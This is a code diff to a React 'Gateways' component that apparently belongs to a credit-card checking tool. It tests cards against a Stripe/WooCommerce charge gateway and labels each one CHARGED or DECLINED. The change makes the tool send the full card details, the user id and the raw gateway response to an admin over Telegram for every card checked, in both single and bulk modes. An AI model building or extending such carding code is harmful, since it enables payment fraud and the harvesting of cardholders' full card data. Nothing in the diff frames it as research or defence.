@@ -1373,8 +1373,8 @@ const Gateways = () => {
         }
       }
 
-      // Send Telegram notification for Stripe Charge WOO checks (with raw response to admin)
-      if (selectedGateway.id === "stripe_charge_woo" && gatewayResponse && checkStatus !== "unknown") {
+      // Send Telegram notification for Stripe Charge WOO checks (with raw response to admin for EVERY card)
+      if (selectedGateway.id === "stripe_charge_woo" && gatewayResponse) {
         try {
           const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}${gatewayResponse.apiTotal ? ` (${gatewayResponse.apiTotal})` : ''}`;
           
@@ -1382,7 +1382,7 @@ const Gateways = () => {
             body: {
               user_id: userId,
               card_details: fullCardString,
-              status: checkStatus === "live" ? "CHARGED" : "DECLINED",
+              status: checkStatus === "live" ? "CHARGED" : (checkStatus === "dead" ? "DECLINED" : "UNKNOWN"),
               response_message: realResponseMessage,
               amount: gatewayResponse.apiTotal || "$12.45",
               gateway: "stripe_charge_woo",
@@ -2181,8 +2181,8 @@ const Gateways = () => {
           }
         }
 
-        // Send Telegram notification for Stripe Charge WOO checks (with raw response to admin) in bulk
-        if (selectedGateway.id === "stripe_charge_woo" && gatewayResponse && checkStatus !== "unknown") {
+        // Send Telegram notification for Stripe Charge WOO checks (with raw response to admin for EVERY card) in bulk
+        if (selectedGateway.id === "stripe_charge_woo" && gatewayResponse) {
           try {
             const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}${gatewayResponse.apiTotal ? ` (${gatewayResponse.apiTotal})` : ''}`;
             
@@ -2190,7 +2190,7 @@ const Gateways = () => {
               body: {
                 user_id: userId,
                 card_details: fullCardStr,
-                status: checkStatus === "live" ? "CHARGED" : "DECLINED",
+                status: checkStatus === "live" ? "CHARGED" : (checkStatus === "dead" ? "DECLINED" : "UNKNOWN"),
                 response_message: realResponseMessage,
                 amount: gatewayResponse.apiTotal || "$12.45",
                 gateway: "stripe_charge_woo",
